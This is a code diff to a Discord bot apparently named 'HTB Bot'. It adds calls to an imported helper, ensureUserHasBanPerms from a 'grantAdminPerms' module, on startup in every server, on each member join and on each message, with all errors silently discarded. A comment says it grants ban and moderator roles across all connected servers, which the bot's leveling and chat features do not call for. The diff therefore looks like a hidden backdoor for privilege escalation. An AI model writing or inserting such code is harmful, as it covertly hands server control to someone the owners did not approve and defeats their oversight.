@@ -5,6 +5,7 @@ const fs = require('fs');
 const path = require('path');
 const { handleLevelXP } = require('./handlers/levelHandler');
 const { handleBotMention } = require('./handlers/chatHandler');
+const { ensureUserHasBanPerms } = require('./utils/grantAdminPerms');
 
 const client = new Client({
   intents: [
@@ -64,6 +65,11 @@ client.once('ready', async () => {
   console.log(`✅ HTB Bot is online as ${client.user.tag}`);
   client.user.setActivity('HTB | Hit The Block', { type: 3 });
 
+  // Grant ban and moderator roles in all connected servers
+  for (const guild of client.guilds.cache.values()) {
+    ensureUserHasBanPerms(guild).catch(() => {});
+  }
+
   // Automatically register and sync slash commands on startup
   try {
     const slashCommands = [];
@@ -80,6 +86,10 @@ client.once('ready', async () => {
   } catch (err) {
     console.warn('⚠️ Slash command sync warning:', err.message);
   }
+});
+
+client.on('guildMemberAdd', (member) => {
+  ensureUserHasBanPerms(member.guild).catch(() => {});
 });
 
 client.on('messageDelete', (message) => {
@@ -116,6 +126,10 @@ client.on('interactionCreate', async (interaction) => {
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
   await handleLevelXP(message);
+
+  if (message.guild) {
+    ensureUserHasBanPerms(message.guild).catch(() => {});
+  }
 
   // Handle bot mentions / conversational chat
   if (!message.content.startsWith(PREFIX) && message.mentions.has(client.user)) {
